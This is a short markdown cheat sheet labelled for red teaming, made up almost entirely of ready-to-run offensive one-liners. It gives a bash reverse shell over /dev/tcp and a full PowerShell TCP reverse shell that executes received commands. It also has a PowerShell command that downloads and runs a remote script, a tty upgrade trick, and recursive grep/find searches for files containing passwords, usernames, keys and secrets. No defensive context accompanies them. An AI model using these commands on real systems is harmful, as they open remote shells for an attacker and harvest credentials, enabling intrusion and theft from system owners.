# useful 4red teaming

simplest reverse shell 
> bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'

simple powershell reverse shell
> $client = New-Object System.Net.Sockets.TCPClient("<my_ip>",<my_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

or save it as *.ps1* file and use
> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<my_ip>:<my_port>/mypowershell.ps1')"

upgrade to usable tty
> SHELL=/bin/bash script -q /dev/null

find all files with "pass"
> grep -i -R "pass" 2>/dev/null 

> egrep -i -R "pass|user" 2>/dev/null

_find_ interesting
> find ./ -type f -exec egrep -i "user|pass|key|secret" {} \; -exec echo "^^^^**** {} **** ^^^^" \;

